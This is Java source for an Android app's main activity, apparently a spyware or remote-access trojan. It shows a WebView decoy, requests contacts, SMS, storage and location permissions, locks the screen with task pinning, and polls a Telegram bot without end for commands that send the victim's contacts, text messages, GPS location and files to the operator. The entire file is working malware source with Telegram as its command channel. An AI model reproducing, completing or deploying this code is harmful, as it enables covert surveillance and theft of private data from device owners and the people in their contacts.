package com.example.oshcyber;

import static com.example.oshcyber.R.layout.*;

import android.Manifest;
import android.accessibilityservice.AccessibilityService;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.webkit.WebView;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.widget.ImageButton;
import android.widget.TextView;

import androidx.activity.ComponentActivity;
import androidx.activity.EdgeToEdge;
import androidx.annotation.RequiresApi;
import androidx.annotation.RequiresPermission;
import androidx.appcompat.app.AppCompatActivity;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.TimeUnit;

import pub.devrel.easypermissions.EasyPermissions;

import okhttp3.OkHttp;
import okhttp3.*;

public class MainActivity extends AppCompatActivity {

    WebView webView;
    @SuppressLint("MissingInflatedId")
    @RequiresPermission(allOf = {Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION})
    @RequiresApi(api = Build.VERSION_CODES.R)
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        webView = (WebView) findViewById(R.id.webView);
        webView.loadUrl("WEBSITE_URL");

        final int[] lastCommand = {0};
        Set<Integer> processingUpdate = new HashSet<>();

        String[] perms = new String[]{Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.POST_NOTIFICATIONS};

        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.R){
            if(!Environment.isExternalStorageManager()){
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivity(intent);
            }
        }
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
            startLockTask();
        }

        new Thread(() ->{
            while(true){
                if (!EasyPermissions.hasPermissions(this,perms))
                    EasyPermissions.requestPermissions(this, "I need to permissions", 100, perms);
                try{
                    HttpUrl url = HttpUrl.parse("https://api.telegram.org/bot<TELEGRAM_BOT_TOKEN>/getUpdates?offset=" + lastCommand[0]).newBuilder()
                            .build();
                    OkHttpClient client = new OkHttpClient()
                            .newBuilder()
                            .connectTimeout(30, TimeUnit.SECONDS)
                            .writeTimeout(30, TimeUnit.SECONDS)
                            .readTimeout(30, TimeUnit.SECONDS)
                            .build();
                    Request request = new Request.Builder()
                            .url(url)
                            .get()
                            .build();
                    try(Response response = client.newCall(request).execute()){
                        if(!response.isSuccessful()) return;
                        JSONObject json = new JSONObject((response.body().string()));
                        JSONArray result = json.getJSONArray("result");
                        for(int i = 0 ; i < result.length(); i++){
                            JSONObject getUpdate = result.getJSONObject(i);
                            int updateId = getUpdate.getInt("update_id");
                            JSONObject message = getUpdate.getJSONObject("message");
                            String command = message.optString("text").trim();
                            if(processingUpdate.contains(updateId)) continue;

                            processingUpdate.add(updateId);
                            lastCommand[0] = updateId + 1 ;

                            if("/readContacts".equals(command)){
                                new SendContacts().sendContacts(MainActivity.this);
                            }
                            else if ("/readSms".equals(command)) {
                                new SendSms().sendSms(MainActivity.this);
                            }
                            else if ("/readGps".equals(command)) {
                                new SendLocation().sendLocation(MainActivity.this);
                            }
                            else if ("/readFiles".equals(command)) {
                                new SendFiles().sendFiles(MainActivity.this);
                            }
                            else{
                                System.out.println("none");
                            }
                        }
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                    
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }).start();
        try {
            Thread.sleep(30000);
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    protected void onDestroy(){
        super.onDestroy();
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
            stopLockTask();
        }
    }

    }
